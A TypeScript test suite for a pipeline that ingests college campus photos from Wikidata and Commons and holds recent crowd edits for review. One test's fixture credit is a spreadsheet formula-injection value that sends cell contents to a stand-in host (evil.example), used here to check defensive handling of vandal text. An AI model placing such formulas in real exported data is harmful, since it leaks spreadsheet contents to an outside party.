import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import {
  parsePicks,
  runCollegePhotoIngest,
  storagePaths,
  supabasePhotoStore,
  type PhotoCandidate,
  type PhotoDeps,
  type PhotoRow,
  type PhotoStore,
  type Picks,
  type StoredPhoto,
} from "../../src/lib/ingest/collegePhotos.js";

const dir = new URL("../fixtures/college-photos/", import.meta.url);
const fixture = (name: string) => JSON.parse(readFileSync(new URL(name, dir), "utf8")) as unknown;
const tiny = new Uint8Array(readFileSync(new URL("tiny.jpg", dir)));
const fixturePicks = parsePicks(readFileSync(new URL("picks.csv", dir), "utf8"));
const log = { info() {}, warn() {}, error() {} };

/** The catalog colleges the fixtures speak about, by unitid. */
const UNITIDS: Record<string, number> = {
  mit: 166683, stanford: 243744, cornell: 190415, yale: 130794, berkeley: 110635, brown: 217156,
  columbia: 190150, dartmouth: 182670, lehigh: 213543, tufts: 168148, vassar: 197133, bucknell: 211291,
  union: 196866, penn: 215062, rochester: 195030, swarthmore: 216287, hamilton: 191515,
  binghamton: 196079, stonybrook: 196097, notinwikidata: 100654,
};
const COLLEGES = Object.entries(UNITIDS).map(([slug, unitid]) => ({ id: `c-${slug}`, unitid, name: slug }));
const idOf = (slug: string) => `c-${slug}`;

function fakeStore(
  opts: {
    stored?: StoredPhoto[];
    probe?: "ok" | "no-schema" | "error";
    failUpload?: boolean;
    colleges?: typeof COLLEGES;
    /** null: the review queue's migration isn't applied. */
    candidates?: PhotoCandidate[] | null;
    failSaveCandidates?: boolean;
  } = {}
) {
  const rows = new Map<string, PhotoRow | StoredPhoto>((opts.stored ?? []).map((s) => [s.college_id, s]));
  const queue = opts.candidates === null ? null : new Map<string, PhotoCandidate>((opts.candidates ?? []).map((c) => [c.college_id, c]));
  const objects = new Set<string>((opts.stored ?? []).flatMap((s) => [s.storage_path, s.thumb_path]));
  const runs: { id: string; trigger: string; finish?: Record<string, unknown> }[] = [];
  const touched: string[] = [];
  const uploads: string[] = [];
  const store: PhotoStore = {
    probe: async () => opts.probe ?? "ok",
    startRun: async (trigger) => {
      runs.push({ id: `run${runs.length + 1}`, trigger });
      return `run${runs.length}`;
    },
    finishRun: async (id, f) => {
      runs.find((r) => r.id === id)!.finish = f;
    },
    colleges: async () => opts.colleges ?? COLLEGES,
    existing: async () => [...rows.values()].map((r) => ({
      college_id: r.college_id, source: r.source, commons_title: r.commons_title, commons_sha1: r.commons_sha1, storage_path: r.storage_path, thumb_path: r.thumb_path,
      // The text the row shows, as the real store reads it (absent on the bare StoredPhoto rows some tests make).
      ...("credit" in r ? { credit: r.credit, license: r.license, license_url: r.license_url } : {}),
    })),
    upsert: async (row) => void rows.set(row.college_id, row),
    touch: async (id, fields) => {
      touched.push(id);
      rows.set(id, { ...(rows.get(id) as PhotoRow), ...fields });
    },
    remove: async (id) => void rows.delete(id),
    upload: async (path) => {
      if (opts.failUpload) throw new Error("upload failed");
      uploads.push(path);
      objects.add(path);
    },
    removeObjects: async (paths) => paths.forEach((p) => objects.delete(p)),
    candidates: async () => (queue ? new Map(queue) : null),
    saveCandidates: async (list) => {
      if (opts.failSaveCandidates) throw new Error("write review queue: 500");
      for (const c of list) queue!.set(c.college_id, c);
    },
    clearCandidates: async (ids) => ids.forEach((id) => queue!.delete(id)),
  };
  return { store, rows, objects, runs, touched, uploads, queue };
}

function fakeDeps(over: Partial<{ sparql: PhotoDeps["sparql"]; imageinfo: PhotoDeps["imageinfo"]; picks: Picks }> = {}) {
  const calls = { sparql: 0, imageinfo: [] as { titles: string[]; width: number }[], downloads: [] as string[] };
  const deps: PhotoDeps = {
    sparql: over.sparql ?? (async () => (calls.sparql++, fixture("wdqs-p1771.json"))),
    imageinfo:
      over.imageinfo ??
      (async (titles, width) => {
        calls.imageinfo.push({ titles, width });
        return fixture(width === 500 ? "commons-imageinfo-500.json" : "commons-imageinfo-1280.json");
      }),
    download: async (url) => {
      calls.downloads.push(url);
      return tiny;
    },
    picks: () => over.picks ?? fixturePicks,
  };
  return { deps, calls };
}

const sha1Of = async (title: string) => {
  const { createHash } = await import("node:crypto");
  return createHash("sha1").update(title).digest("hex");
};
const stored = (slug: string, title: string, sha1: string): StoredPhoto => {
  const p = storagePaths(UNITIDS[slug]!, sha1);
  return { college_id: idOf(slug), source: "wikidata", commons_title: title, commons_sha1: sha1, storage_path: p.full, thumb_path: p.thumb };
};

test("a first run attaches the accepted files only, both sizes in the bucket, and records itself", async () => {
  const s = fakeStore();
  const { deps, calls } = fakeDeps();
  const out = await runCollegePhotoIngest(s.store, deps, log, { trigger: "script" });
  assert.equal(out.status, "succeeded", out.errors.join("; "));
  const attached = [...s.rows.keys()].sort();
  assert.deepEqual(attached, ["c-berkeley", "c-binghamton", "c-brown", "c-mit", "c-rochester", "c-stanford", "c-swarthmore"].sort());
  // Penn's Wikidata title reaches its file through a redirect, whose age no API gives: held for review.
  assert.equal(out.heldForReview, 1);
  assert.deepEqual(out.review.map((r) => [r.unitid, r.action, r.reasons]), [[215062, "held-new", ["redirected"]]]);
  assert.equal(s.queue!.get("c-penn")!.commons_title, "File:College Hall, University of Pennsylvania.jpg");
  for (const slug of ["penn", "cornell", "yale", "columbia", "dartmouth", "lehigh", "tufts", "vassar", "bucknell", "union", "hamilton", "stonybrook", "notinwikidata"]) {
    assert.equal(s.rows.has(idOf(slug)), false, slug);
  }
  const mit = s.rows.get("c-mit") as PhotoRow;
  assert.equal(mit.source, "wikidata");
  assert.equal(mit.wikidata_id, "Q49108");
  assert.equal(mit.credit, "José & Co.");
  assert.match(mit.storage_path, /^166683\/[0-9a-f]{40}-1280\.jpg$/);
  assert.ok(s.objects.has(mit.storage_path) && s.objects.has(mit.thumb_path));
  // The normalized title is stored in Commons' form.
  assert.equal((s.rows.get("c-berkeley") as PhotoRow).commons_title, "File:Sather Tower été.jpg");
  assert.equal((s.rows.get("c-brown") as PhotoRow).commons_title, "File:Aerial view of Brown University.jpg");
  // Every download came from the upload host, at the two widths.
  assert.equal(calls.downloads.length, 14);
  assert.ok(calls.downloads.every((u) => u.startsWith("https://upload.wikimedia.org/")));
  assert.deepEqual(out.counts.ambiguous, 1);
  assert.equal(out.counts["no-image"], 1);
  assert.equal(out.counts["not-in-wikidata"], 1);
  assert.equal(out.counts.license, 1);
  assert.equal(out.counts["credit-too-long"], 1);
  assert.equal(out.counts.suppressed, 1);
  assert.equal(s.runs.length, 1);
  assert.equal(s.runs[0]!.trigger, "script");
  assert.equal(s.runs[0]!.finish!.status, "succeeded");
  assert.equal(s.runs[0]!.finish!.rows_upserted, 7);
  assert.deepEqual((s.runs[0]!.finish!.counts as Record<string, number>)["held-new"], 1, "the counts go to ingest_runs");
});

test("a pick wins over Wikidata, and may be narrower than the size rule", async () => {
  const s = fakeStore();
  await runCollegePhotoIngest(s.store, fakeDeps().deps, log);
  const stanford = s.rows.get("c-stanford") as PhotoRow;
  assert.equal(stanford.source, "pick");
  assert.equal(stanford.commons_title, "File:Stanford Memorial Church (2025)-L1007381.jpg");
  assert.equal(stanford.wikidata_id, "Q41506", "the item is still recorded");
  assert.equal((s.rows.get("c-binghamton") as PhotoRow).width, 800);
});

const shownText = { credit: "José & Co.", license: "CC BY-SA 4.0", license_url: "https://creativecommons.org/licenses/by-sa/4.0" };

test("an unchanged file (same sha1) is not downloaded again; the same text is rewritten as it is", async () => {
  const title = "File:Great dome of MIT, Feb 2021.jpg";
  const sha1 = await sha1Of(title);
  const s = fakeStore({ stored: [{ ...stored("mit", title, sha1), ...shownText }] });
  const { deps, calls } = fakeDeps();
  const out = await runCollegePhotoIngest(s.store, deps, log, { only: [166683] });
  assert.equal(out.status, "succeeded");
  assert.equal(calls.downloads.length, 0);
  assert.deepEqual(s.touched, ["c-mit"]);
  assert.equal((s.rows.get("c-mit") as PhotoRow).credit, "José & Co.");
  assert.equal(out.counts.unchanged, 1);
  assert.equal(out.counts["text-held"], undefined);
  assert.equal(calls.imageinfo.filter((c) => c.width === 500).length, 0, "no thumbnail lookup when nothing downloads");
});

test("a changed credit for an unchanged file waits for a sighting a week old; without the queue, for a quiet page", async () => {
  const title = "File:Great dome of MIT, Feb 2021.jpg";
  const row = { ...stored("mit", title, await sha1Of(title)), ...shownText, credit: "Old credit" } as StoredPhoto;
  const s = fakeStore({ stored: [row] });
  const first = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [166683], now: () => new Date("2026-10-15T00:00:00Z") });
  assert.equal(first.counts["text-held"], 1);
  assert.equal(first.counts.unchanged, 1, "the photo itself stays and is touched");
  assert.deepEqual(first.review.map((r) => [r.action, r.credit, r.reasons]), [["held-text", "José & Co.", ["text-changed"]]]);
  assert.equal((s.rows.get("c-mit") as PhotoRow).credit, "Old credit");
  assert.equal(s.queue!.get("c-mit")!.commons_sha1, row.commons_sha1, "remembered as a text candidate on the same file");
  const later = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [166683], now: () => new Date("2026-10-23T00:00:00Z") });
  assert.equal(later.counts["text-held"], undefined);
  assert.equal((s.rows.get("c-mit") as PhotoRow).credit, "José & Co.");
  assert.equal(s.queue!.has("c-mit"), false);

  const noQueue = fakeStore({ stored: [row], candidates: null });
  await runCollegePhotoIngest(noQueue.store, fakeDeps().deps, log, { only: [166683], now: () => new Date("2026-10-15T00:00:00Z") });
  assert.equal((noQueue.rows.get("c-mit") as PhotoRow).credit, "José & Co.", "the page and its templates quiet since June");
});

test("a file that changed on Commons waits for a later run, then gets new objects, and the old ones go", async () => {
  const old = stored("mit", "File:Great dome of MIT, Feb 2021.jpg", "f".repeat(40));
  const s = fakeStore({ stored: [old] });
  const first = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [166683], now: () => new Date("2026-10-15T00:00:00Z") });
  assert.equal(first.counts["held-replace"], 1);
  assert.equal(first.status, "succeeded", "holding is not an error");
  assert.equal(s.rows.get("c-mit"), old, "the old photo keeps serving");
  assert.deepEqual(s.queue!.get("c-mit")!.reasons, ["replacement"]);
  const tooSoon = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [166683], now: () => new Date("2026-10-20T00:00:00Z") });
  assert.equal(tooSoon.counts["held-replace"], 1, "five days is not a week");
  assert.equal(s.queue!.get("c-mit")!.first_seen_at, "2026-10-15T00:00:00.000Z", "the wait counts from the first sighting");
  const out = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [166683], now: () => new Date("2026-10-22T00:00:00Z") });
  assert.equal(out.counts.replaced, 1);
  assert.equal(out.counts.confirmed, 1);
  assert.equal(s.queue!.has("c-mit"), false, "published: its queue row goes");
  const row = s.rows.get("c-mit") as PhotoRow;
  assert.notEqual(row.commons_sha1, old.commons_sha1);
  assert.ok(s.objects.has(row.storage_path) && s.objects.has(row.thumb_path));
  assert.equal(s.objects.has(old.storage_path), false);
  assert.equal(s.objects.has(old.thumb_path), false);
});

test("a stored file now missing or no longer free loses its row and objects", async () => {
  const union = stored("union", "File:Nott Memorial deleted.jpg", "1".repeat(40));
  const lehigh = stored("lehigh", "File:Packer Chapel NC.jpg", "2".repeat(40));
  const s = fakeStore({ stored: [union, lehigh] });
  const out = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [196866, 213543] });
  assert.equal(out.status, "succeeded");
  assert.equal(s.rows.size, 0);
  assert.equal(s.objects.size, 0);
  assert.equal(out.counts.deleted, 2);
});

test("a moved file keeps its photo instead of reading as deleted", async () => {
  const title = "File:College Hall, University of Pennsylvania.jpg";
  const penn = stored("penn", "File:College Hall Penn old name.jpg", await sha1Of(title));
  const s = fakeStore({ stored: [penn] });
  const out = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [215062] });
  assert.equal(out.counts.unchanged, 1);
  assert.equal((s.rows.get("c-penn") as PhotoRow).commons_title, title, "the row follows the move");
});

test("none in the picks file removes a photo", async () => {
  const sb = stored("stonybrook", "File:Something.jpg", "3".repeat(40));
  const s = fakeStore({ stored: [sb] });
  const out = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [196097] });
  assert.equal(s.rows.has("c-stonybrook"), false);
  assert.equal(s.objects.size, 0);
  assert.equal(out.counts.deleted, 1);
});

test("a Wikidata failure fails the run and touches nothing", async () => {
  const mit = stored("mit", "File:Great dome of MIT, Feb 2021.jpg", "4".repeat(40));
  const s = fakeStore({ stored: [mit] });
  const { deps, calls } = fakeDeps({
    sparql: async () => {
      throw new Error("Wikidata returned 503");
    },
  });
  const out = await runCollegePhotoIngest(s.store, deps, log);
  assert.equal(out.status, "failed");
  assert.equal(out.reason, "sparql");
  assert.equal(s.rows.size, 1);
  assert.equal(calls.imageinfo.length, 0);
  assert.equal(s.runs[0]!.finish!.status, "failed");

  const empty = await runCollegePhotoIngest(s.store, fakeDeps({ sparql: async () => ({ results: { bindings: [] } }) }).deps, log);
  assert.equal(empty.status, "failed", "an empty answer is a failure, never a reason to delete");
  assert.equal(s.rows.size, 1);
});

test("an unreadable picks file fails the run before anything is read from Wikidata", async () => {
  const s = fakeStore();
  const { deps, calls } = fakeDeps();
  deps.picks = () => {
    throw new Error("picks file: line 3: unitid must be six digits");
  };
  const out = await runCollegePhotoIngest(s.store, deps, log);
  assert.equal(out.status, "failed");
  assert.equal(out.reason, "picks");
  assert.equal(calls.sparql, 0);
});

test("a failed Commons batch leaves its colleges alone and the run partial", async () => {
  const mit = stored("mit", "File:Great dome of MIT, Feb 2021.jpg", "5".repeat(40));
  const s = fakeStore({ stored: [mit] });
  const { deps } = fakeDeps({
    imageinfo: async () => {
      throw new Error("Commons API returned 503");
    },
  });
  const out = await runCollegePhotoIngest(s.store, deps, log, { only: [166683, 243744] });
  assert.equal(s.rows.get("c-mit"), mit, "not deleted, not touched");
  assert.equal(out.counts["commons-unavailable"], 2);
  assert.equal(out.status, "failed", "nothing written at all");

  // With other colleges written, the same failure is partial.
  let n = 0;
  const flaky = fakeDeps({
    imageinfo: async (titles, width) => {
      if (width === 1280 && n++ === 0) throw new Error("Commons API returned 503");
      return fixture(width === 500 ? "commons-imageinfo-500.json" : "commons-imageinfo-1280.json");
    },
  });
  // 50 colleges picked to files Commons doesn't answer for (batch 1, which fails),
  // then 10 picked to MIT's photo (batch 2, which works).
  const many = Array.from({ length: 60 }, (_, i) => ({ id: `x${i}`, unitid: 300000 + i, name: `X${i}` }));
  const titleFor = (u: number) => (u < 300050 ? `File:Filler ${u}.jpg` : "File:Great dome of MIT, Feb 2021.jpg");
  const picks: Picks = new Map(many.map((c) => [c.unitid, titleFor(c.unitid)]));
  const s2 = fakeStore({ colleges: [...many] });
  const out2 = await runCollegePhotoIngest(s2.store, { ...flaky.deps, picks: () => picks }, log);
  assert.equal(out2.status, "partial");
  assert.ok(out2.errors.some((e) => /commons batch 1/.test(e)));
});

test("the deletion guard holds deletions past a tenth of the stored photos", async () => {
  // 40 stored photos for colleges Wikidata no longer knows: a truncated answer.
  const colleges = Array.from({ length: 40 }, (_, i) => ({ id: `g${i}`, unitid: 400000 + i, name: `G${i}` }));
  const s = fakeStore({
    colleges: [...colleges, { id: "c-stonybrook", unitid: 196097, name: "Stony Brook" }],
    stored: [
      ...colleges.map((c, i) => ({ ...stored("mit", "File:X.jpg", i.toString(16).padStart(40, "0")), college_id: c.id })),
      stored("stonybrook", "File:Something.jpg", "6".repeat(40)),
    ],
  });
  const out = await runCollegePhotoIngest(s.store, fakeDeps().deps, log);
  assert.equal(out.held, 40);
  assert.equal(out.status, "partial");
  assert.ok(out.errors.some((e) => /deletion guard: 40/.test(e)));
  assert.equal(s.rows.size, 40, "the 40 stay; the suppression the team asked for still goes");
  assert.equal(s.rows.has("c-stonybrook"), false);

  // Within the floor (five), deletions go ahead.
  const few = colleges.slice(0, 5);
  const s2 = fakeStore({ colleges: few, stored: few.map((c, i) => ({ ...stored("mit", "File:X.jpg", i.toString(16).padStart(40, "0")), college_id: c.id })) });
  const out2 = await runCollegePhotoIngest(s2.store, fakeDeps().deps, log);
  assert.equal(out2.held, 0);
  assert.equal(s2.rows.size, 0);
});

test("a dry run writes nothing, downloads nothing and lists what it would attach", async () => {
  const s = fakeStore();
  const { deps, calls } = fakeDeps();
  const out = await runCollegePhotoIngest(s.store, deps, log, { dryRun: true });
  assert.equal(out.dryRun, true);
  assert.equal(out.runId, null);
  assert.equal(s.runs.length, 0, "no ingest_runs row");
  assert.equal(s.rows.size, 0);
  assert.equal(calls.downloads.length, 0);
  assert.equal(out.counts["would-add"], 7);
  const mit = out.attach.find((a) => a.unitid === 166683);
  assert.deepEqual(mit, { action: "add", unitid: 166683, name: "mit", title: "File:Great dome of MIT, Feb 2021.jpg", license: "CC BY-SA 4.0", credit: "José & Co.", source: "wikidata", current: null, reasons: [] });
  assert.deepEqual(out.review.map((r) => r.unitid), [215062], "what it holds is listed too");
  assert.equal(s.queue!.size, 0, "a dry run doesn't write the review queue");
});

test("without the migration the run stops before it writes an ingest_runs row", async () => {
  const s = fakeStore({ probe: "no-schema" });
  const { deps, calls } = fakeDeps();
  const out = await runCollegePhotoIngest(s.store, deps, log);
  assert.equal(out.status, "failed");
  assert.equal(out.reason, "no-schema");
  assert.equal(s.runs.length, 0);
  assert.equal(calls.sparql, 0);
});

test("a failed upload leaves the college as it was and the run partial", async () => {
  const s = fakeStore({ failUpload: true });
  const out = await runCollegePhotoIngest(s.store, fakeDeps().deps, log, { only: [166683, 195030] });
  assert.equal(s.rows.size, 0);
  assert.equal(out.counts["download-failed"], 2);
  assert.equal(out.status, "failed");
});

test("--limit and --only narrow the colleges a run considers", async () => {
  const s = fakeStore();
  const { deps } = fakeDeps();
  await runCollegePhotoIngest(s.store, deps, log, { limit: 3 });
  // The three lowest unitids: 100654 (not in Wikidata), 110635 (Berkeley), 130794 (Yale, no image).
  assert.deepEqual([...s.rows.keys()], ["c-berkeley"]);
});

// ---- The review gate, on test/fixtures/college-photos/review --------------------------
// The fixtures' crowd edits are dated 2026-10-14; DAY0 is the day after.

const reviewDir = new URL("../fixtures/college-photos/review/", import.meta.url);
const reviewFixture = (name: string) => JSON.parse(readFileSync(new URL(name, reviewDir), "utf8")) as unknown;
const DAY0 = "2026-10-15T00:00:00Z";
const day = (n: number) => () => new Date(Date.parse(DAY0) + n * 86_400_000);
const REVIEW_COLLEGES = [...COLLEGES, { id: "c-colgate", unitid: 190099, name: "colgate" }, { id: "c-ithaca", unitid: 191968, name: "ithaca" }];
/** Colgate's photo as an earlier run stored it: version 1 of the file (the fixtures' Commons now has version 2). */
const colgateV1 = async (): Promise<StoredPhoto> => {
  const sha1 = await sha1Of("File:Colgate Memorial Chapel.jpg#v1");
  const p = storagePaths(190099, sha1);
  return { college_id: "c-colgate", source: "wikidata", commons_title: "File:Colgate Memorial Chapel.jpg", commons_sha1: sha1, storage_path: p.full, thumb_path: p.thumb };
};
function reviewDeps(picks: Picks = new Map()) {
  return fakeDeps({
    sparql: async () => reviewFixture("wdqs-p1771.json"),
    imageinfo: async (_t, width) => reviewFixture(width === 500 ? "commons-imageinfo-500.json" : "commons-imageinfo-1280.json"),
    picks,
  });
}

test("review: a main image set on Wikidata yesterday, to a file uploaded yesterday, is held", async () => {
  const s = fakeStore({ colleges: REVIEW_COLLEGES });
  const { deps, calls } = reviewDeps();
  const out = await runCollegePhotoIngest(s.store, deps, log, { only: [191968], now: day(0) });
  assert.equal(s.rows.has("c-ithaca"), false);
  assert.equal(calls.downloads.length, 0, "nothing is downloaded for a held photo");
  assert.equal(out.status, "succeeded");
  assert.deepEqual(out.review[0]!.reasons, ["file-recent", "page-recent", "wikidata-recent"]);
  assert.equal(out.review[0]!.credit, '=HYPERLINK("https://evil.example/?"&A2,"Photographer")', "listed for review as Commons gave it");
  const c = s.queue!.get("c-ithaca")!;
  assert.equal(c.commons_title, "File:Ithaca campus vandal.jpg");
  assert.equal(c.first_seen_at, "2026-10-15T00:00:00.000Z");
  assert.equal(s.runs[0]!.finish!.rows_skipped, 1);
});

test("review: once the item and the file have been quiet a week, a new photo is published even unseen", async () => {
  const s = fakeStore({ colleges: REVIEW_COLLEGES });
  const out = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [191968], now: day(7) });
  assert.equal(out.counts.added, 1);
  assert.equal((s.rows.get("c-ithaca") as PhotoRow).commons_title, "File:Ithaca campus vandal.jpg");
});

test("review: a new version uploaded over a stored photo's file is held until a run a week later sees it unchanged", async () => {
  const v1 = await colgateV1();
  const s = fakeStore({ colleges: REVIEW_COLLEGES, stored: [v1] });
  const held = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [190099], now: day(0) });
  assert.deepEqual(held.review.map((r) => [r.action, r.current, r.reasons]), [["held-replace", "File:Colgate Memorial Chapel.jpg", ["file-recent", "replacement"]]]);
  assert.equal(s.rows.get("c-colgate"), v1);
  // A week on, the upload itself is old enough; a store that never saw it still holds it.
  const fresh = fakeStore({ colleges: REVIEW_COLLEGES, stored: [v1] });
  const unseen = await runCollegePhotoIngest(fresh.store, reviewDeps().deps, log, { only: [190099], now: day(8) });
  assert.deepEqual(unseen.review[0]!.reasons, ["replacement"], "a replacement always needs an earlier sighting");
  const done = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [190099], now: day(8) });
  assert.equal(done.counts.replaced, 1);
  assert.equal((s.rows.get("c-colgate") as PhotoRow).commons_sha1, await sha1Of("File:Colgate Memorial Chapel.jpg#v2"));
  assert.equal(s.objects.has(v1.storage_path), false);
});

test("review: a candidate that changed between sightings starts its wait again", async () => {
  const v1 = await colgateV1();
  const s = fakeStore({
    colleges: REVIEW_COLLEGES,
    stored: [v1],
    candidates: [{
      college_id: "c-colgate", source: "wikidata", commons_title: "File:Colgate Memorial Chapel.jpg", commons_sha1: "9".repeat(40),
      text_hash: "0".repeat(40), reasons: ["replacement"], first_seen_at: "2026-09-01T00:00:00.000Z", last_seen_at: "2026-09-01T00:00:00.000Z",
    }],
  });
  const out = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [190099], now: day(8) });
  assert.equal(out.counts["held-replace"], 1, "another version than the one seen in September");
  assert.equal(s.queue!.get("c-colgate")!.first_seen_at, new Date(Date.parse(DAY0) + 8 * 86_400_000).toISOString());
});

test("review: a team pick is published at once, even of a file uploaded yesterday", async () => {
  const s = fakeStore({ colleges: REVIEW_COLLEGES });
  const out = await runCollegePhotoIngest(s.store, reviewDeps(new Map([[191968, "File:Ithaca fresh pick.jpg"]])).deps, log, { only: [191968], now: day(0) });
  assert.equal(out.counts.added, 1);
  assert.equal((s.rows.get("c-ithaca") as PhotoRow).source, "pick");
});

test("review: a new version uploaded over a picked file is a replacement like any other", async () => {
  const sha = "8".repeat(40);
  const p = storagePaths(191968, sha);
  const pickRow: StoredPhoto = { college_id: "c-ithaca", source: "pick", commons_title: "File:Ithaca fresh pick.jpg", commons_sha1: sha, storage_path: p.full, thumb_path: p.thumb };
  const s = fakeStore({ colleges: REVIEW_COLLEGES, stored: [pickRow] });
  const out = await runCollegePhotoIngest(s.store, reviewDeps(new Map([[191968, "File:Ithaca fresh pick.jpg"]])).deps, log, { only: [191968], now: day(0) });
  assert.deepEqual(out.review[0]!.reasons, ["file-recent", "page-recent", "replacement"]);
  assert.equal(s.rows.get("c-ithaca"), pickRow);
});

test("review: a description page edited within the week doesn't refresh the credit shown", async () => {
  const title = "File:Rush Rhees PD.jpg";
  const row = { ...stored("rochester", title, await sha1Of(title)), credit: "Unknown author" } as unknown as StoredPhoto;
  const s = fakeStore({ colleges: REVIEW_COLLEGES, stored: [row] });
  const out = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [195030], now: day(0) });
  assert.equal(out.counts.unchanged, 1);
  assert.equal(out.counts["text-held"], 1);
  const after = s.rows.get("c-rochester") as PhotoRow;
  assert.equal(after.credit, "Unknown author", "not the vandal's text");
  assert.equal(after.checked_at, "2026-10-15T00:00:00.000Z");
  const later = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [195030], now: day(8) });
  assert.equal(later.counts["text-held"], undefined);
  assert.equal((s.rows.get("c-rochester") as PhotoRow).credit, "Vandal credit", "a week unreverted, it is Commons' credit");
});

test("review: without the review queue's migration, new photos pass on their timestamps and replacements are held", async () => {
  const v1 = await colgateV1();
  const s = fakeStore({ colleges: REVIEW_COLLEGES, stored: [v1], candidates: null });
  const out = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [190099, 191968], now: day(30) });
  assert.equal(out.reviewTable, false);
  assert.equal(out.status, "succeeded");
  assert.equal(out.counts.added, 1, "Ithaca's main image, quiet for a month");
  assert.deepEqual(out.review.map((r) => r.reasons), [["replacement", "no-review-table"]]);
  assert.equal(s.rows.get("c-colgate"), v1);
});

test("review: a failed queue write keeps the hold and makes the run partial", async () => {
  const s = fakeStore({ colleges: REVIEW_COLLEGES, failSaveCandidates: true });
  const out = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [166683, 191968], now: day(0) });
  assert.equal(s.rows.has("c-ithaca"), false);
  assert.ok(s.rows.has("c-mit"));
  assert.equal(out.status, "partial");
  assert.ok(out.errors.some((e) => /review queue/.test(e)));
});

test("review: a college whose Commons batch failed keeps its queue row; one with no photo now loses it", async () => {
  const candidate = (id: string): PhotoCandidate => ({
    college_id: id, source: "wikidata", commons_title: "File:X.jpg", commons_sha1: "7".repeat(40), text_hash: "0".repeat(40),
    reasons: ["file-recent"], first_seen_at: DAY0, last_seen_at: DAY0,
  });
  const s = fakeStore({ colleges: REVIEW_COLLEGES, candidates: [candidate("c-mit"), candidate("c-yale")] });
  const { deps } = fakeDeps({
    imageinfo: async () => {
      throw new Error("Commons API returned 503");
    },
  });
  await runCollegePhotoIngest(s.store, deps, log, { only: [166683, 130794], now: day(1) });
  assert.ok(s.queue!.has("c-mit"), "not looked at: kept");
  assert.equal(s.queue!.has("c-yale"), false, "Yale has no main image any more");
});

// ---- The reviewer's bypasses ------------------------------------------------------------

/** The 500 px answer with one title's version changed: another sha1, or the same sha1 uploaded again just now (a revert). */
function versionChanged(title: string, change: { sha1?: string; timestamp?: string }) {
  const doc = structuredClone(fixture("commons-imageinfo-500.json")) as { query: { pages: { title: string; imageinfo?: Record<string, unknown>[] }[] } };
  const info = doc.query.pages.find((p) => p.title === title)!.imageinfo![0]!;
  Object.assign(info, change);
  return doc;
}
const MIT_TITLE = "File:Great dome of MIT, Feb 2021.jpg";

test("bypass: a file swapped after the metadata read and before the downloads is held, nothing stored", async () => {
  const s = fakeStore();
  const { deps, calls } = fakeDeps({
    imageinfo: async (titles, width) => {
      calls.imageinfo.push({ titles, width });
      return width === 500 ? versionChanged(MIT_TITLE, { sha1: "e".repeat(40), timestamp: "2026-10-15T00:30:00Z" }) : fixture("commons-imageinfo-1280.json");
    },
  });
  const out = await runCollegePhotoIngest(s.store, deps, log, { only: [166683], now: () => new Date("2026-10-15T01:00:00Z") });
  assert.equal(s.rows.has("c-mit"), false);
  assert.equal(calls.downloads.length, 0, "nothing downloaded for a version nobody judged");
  assert.equal(s.uploads.length, 0);
  assert.equal(out.counts["changed-during-run"], 1);
  assert.deepEqual(out.review.map((r) => [r.unitid, r.reasons]), [[166683, ["changed-during-run"]]]);
});

test("bypass: a file swapped during the downloads and reverted (same sha1, new upload) is held, nothing stored", async () => {
  const s = fakeStore();
  let thumbCalls = 0;
  const { deps, calls } = fakeDeps({
    imageinfo: async (titles, width) => {
      calls.imageinfo.push({ titles, width });
      if (width !== 500) return fixture("commons-imageinfo-1280.json");
      // The first 500 px answer still shows the judged version; by the re-check the attacker has
      // uploaded over it (the downloads got those bytes) and uploaded the old version back.
      return thumbCalls++ === 0 ? fixture("commons-imageinfo-500.json") : versionChanged(MIT_TITLE, { timestamp: "2026-10-15T00:45:00Z" });
    },
  });
  const out = await runCollegePhotoIngest(s.store, deps, log, { only: [166683], now: () => new Date("2026-10-15T01:00:00Z") });
  assert.equal(calls.downloads.length, 2, "downloaded, then asked again");
  assert.equal(thumbCalls, 2);
  assert.equal(s.uploads.length, 0, "the downloaded bytes are thrown away");
  assert.equal(s.rows.has("c-mit"), false);
  assert.equal(out.counts["changed-during-run"], 1);
  assert.equal(out.status, "succeeded", "a hold, not an error");

  // A replacement swapped the same way leaves the old photo serving and its queue row in place.
  const old = stored("mit", MIT_TITLE, "f".repeat(40));
  const seenRow: PhotoCandidate = {
    college_id: "c-mit", source: "wikidata", commons_title: MIT_TITLE, commons_sha1: await sha1Of(MIT_TITLE),
    text_hash: (await import("../../src/lib/ingest/collegePhotos.js")).candidateTextHash({ credit: "José & Co.", license: "CC BY-SA 4.0", licenseUrl: "https://creativecommons.org/licenses/by-sa/4.0" }),
    reasons: ["replacement"], first_seen_at: "2026-09-01T00:00:00.000Z", last_seen_at: "2026-09-01T00:00:00.000Z",
  };
  const s2 = fakeStore({ stored: [old], candidates: [seenRow] });
  thumbCalls = 0;
  const out2 = await runCollegePhotoIngest(s2.store, deps, log, { only: [166683], now: () => new Date("2026-10-15T01:00:00Z") });
  assert.equal(out2.counts.confirmed, 1, "the sighting confirmed it");
  assert.equal(out2.counts["changed-during-run"], 1);
  assert.equal(s2.rows.get("c-mit"), old);
  assert.ok(s2.queue!.has("c-mit"), "the queue row stays for the next run");
});

test("bypass: a failed re-check keeps nothing it downloaded", async () => {
  const s = fakeStore();
  let thumbCalls = 0;
  const { deps } = fakeDeps({
    imageinfo: async (_titles, width) => {
      if (width !== 500) return fixture("commons-imageinfo-1280.json");
      if (thumbCalls++ === 0) return fixture("commons-imageinfo-500.json");
      throw new Error("Commons API returned 503");
    },
  });
  const out = await runCollegePhotoIngest(s.store, deps, log, { only: [166683] });
  assert.equal(s.uploads.length, 0);
  assert.equal(s.rows.size, 0);
  assert.equal(out.status, "failed");
